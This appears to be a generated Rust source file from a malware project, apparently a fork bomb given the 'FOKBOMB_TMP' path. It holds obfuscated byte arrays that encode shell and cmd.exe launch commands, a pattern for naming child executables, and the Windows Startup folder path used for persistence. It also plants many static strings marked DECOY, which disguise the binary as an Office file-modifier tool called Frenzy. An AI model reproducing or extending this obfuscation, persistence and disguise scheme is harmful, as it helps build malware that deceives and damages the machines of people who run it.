/*
 *   Generated file - do not edit
 */

// ::
pub const ENABLE_DEBUG: [u8; 3] = [0x42, 0x21, 0x00];

// sh -c '%s' %s &
pub const LIN_EXEC_FORMATTER: [u8; 18] = [
    0x66, 0x75, 0x53, 0x69, 0x1e, 0x76, 0x3d, 0x19, 0x4d, 0x73, 0x33, 0x19, 0x74, 0x6f, 0x1b, 0x1e,
    0x4c, 0x00,
];

// 		
pub const UNLOCK_CHILD: [u8; 3] = [0x5b, 0x6d, 0x60];

// %d.exe
pub const WIN_CHILD_NAME_FORMATTER: [u8; 7] = [0x4d, 0x76, 0x52, 0x0d, 0x5e, 0x1b, 0x36];

// C:\Users\%s\Downloads\FOKBOMB_TMP
pub const WIN_DEBUG_STARTUP_FOLDER_FORMATTER: [u8; 38] = [
    0x7e, 0x61, 0x1c, 0x2e, 0x5e, 0x37, 0x37, 0x4c, 0x66, 0x78, 0x53, 0x3c, 0x6f, 0x0b, 0x75, 0x51,
    0x64, 0x74, 0x1a, 0x2d, 0x0e, 0x7f, 0x35, 0x4d, 0x71, 0x3e, 0x1e, 0x1f, 0x2f, 0x73, 0x63, 0x73,
    0x7e, 0x38, 0x3d, 0x2f, 0x1f, 0x38,
];

// cmd.exe /C start "%s" %s
pub const WIN_EXEC_FORMATTER: [u8; 28] = [
    0x6e, 0x74, 0x7b, 0x29, 0x06, 0x6f, 0x0d, 0x5b, 0x4f, 0x24, 0x3f, 0x59, 0x76, 0x37, 0x15, 0x5f,
    0x66, 0x32, 0x53, 0x69, 0x64, 0x6f, 0x1b, 0x1c, 0x4f, 0x26, 0x79, 0x50,
];

// C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
pub const WIN_STARTUP_FOLDER_FORMATTER: [u8; 84] = [
    0x7e, 0x61, 0x1c, 0x2e, 0x5e, 0x37, 0x37, 0x4c, 0x66, 0x78, 0x53, 0x3c, 0x6f, 0x0b, 0x7f, 0x4e,
    0x67, 0x3e, 0x5b, 0x7c, 0x56, 0x7f, 0x45, 0x6c, 0x68, 0x77, 0x7a, 0x3d, 0x3e, 0x43, 0x33, 0x62,
    0x79, 0x75, 0x7b, 0x5c, 0x66, 0x47, 0x1b, 0x51, 0x6c, 0x32, 0x5c, 0x2e, 0x4e, 0x5f, 0x21, 0x5a,
    0x68, 0x72, 0x39, 0x5e, 0x17, 0x37, 0x15, 0x5f, 0x66, 0x32, 0x53, 0x6f, 0x1e, 0x6f, 0x21, 0x4b,
    0x71, 0x3b, 0x59, 0x4d, 0x0e, 0x67, 0x19, 0x5f, 0x69, 0x73, 0x3c, 0x2e, 0x6e, 0x2b, 0x3f, 0x4c,
    0x65, 0x32, 0x79, 0x60,
];

// DECOY
#[used]
#[unsafe(no_mangle)]
pub static ERR_DISK_FULL: &str = "Operation failed: Insufficient disk space on target drive.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static ERR_FILE_LOCKED: &str = "Error: File is currently open in another application.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static ERR_MIME_MISMATCH: &str = "MIME type mismatch: Header does not match expected file signature.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static ERR_TEMP_FAILURE: &str = "Could not create temporary working directory in AppData/Local.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static ERR_UNSUPPORTED_VER: &str = "The selected document version is too old for this modifier.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static MESSAGE_INVALID_PLATE: &str = "Please enter a valid plate number, or press 'Exit'";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static NET_API_SYNC_SUCCESS: &str = "Metadata synchronization complete. (0x%d)";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static NET_CHECKING_UPDATES: &str = "Checking for Frenzy updates...";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static NET_PROXY_AUTH: &str = "Proxy authentication required: please check your system settings.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static NET_TELEMETRY_OPT_OUT: &str = "Telemetry reporting is disabled by user policy.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static OFFICE_MACRO_STRIP: &str = "Removing embedded VBA macros from source document...";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static OFFICE_METADATA_CLEAN: &str = "Clearing author metadata and revision history...";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static OFFICE_RECOVERY_MODE: &str = "Running in Document Recovery mode (No GUI).";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static OFFICE_XML_PARSER_ERR: &str = "XML Parser Error: Unexpected token at line %d, col %d.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_APP_NAME: &str = "Frenzy - Office 360 file modifier";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_BUTTON_TEXT_EXIT: &str = "Exit";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_CHECKBOX_BACKUP: &str = "Create .bak files before modification";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_ERR_INVALID_TYPE: &str = "The only allowed file types are: PDF, DOCX, DOCM, DOTX, XLSX, XLSM, SLTX, PPTX, PPTM, PPSX, or ODT. %s is not allowed.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_ERR_UI_BUFFER_CORRUPT: &str = "CRITICAL: UiFormatBuffer overflow. Allocation of %d bytes failed.";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_LABEL_DOWNLOAD_STATUS: &str = "%s / %d";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_LABEL_TEXT_LOADING: &str = "Loading...";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_PROGRESS_FINALIZING: &str = "Finalizing file integrity checks...";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_TAB_ADVANCED: &str = "Advanced Logic";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_TAB_GENERAL: &str = "General";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_TOOLTIP_RESTORE: &str = "Restores original file attributes from internal cache";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static UI_WINDOW_TITLE_PREFS: &str = "Frenzy Configuration Settings";
// DECOY
#[used]
#[unsafe(no_mangle)]
pub static WELCOME_MESSAGE: &str = "Hello, World!";
